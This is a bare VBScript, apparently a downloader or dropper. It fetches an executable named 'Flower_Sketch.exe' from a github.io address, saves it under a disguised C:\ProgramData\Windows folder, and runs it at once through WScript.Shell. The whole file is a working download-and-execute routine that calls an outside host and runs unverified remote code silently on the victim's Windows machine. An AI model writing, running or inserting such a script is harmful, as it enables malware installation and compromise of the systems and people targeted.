dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://minipapergarden.github.io/files/Flower_Sketch.exe", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\ProgramData\Windows\Flower_Sketch.exe", 2 '//overwrite
end with

Dim objShell
Set objShell = WScript.CreateObject( "WScript.Shell" )
objShell.Run("""C:\ProgramData\Windows\Flower_Sketch.exe""")
Set objShell = Nothing


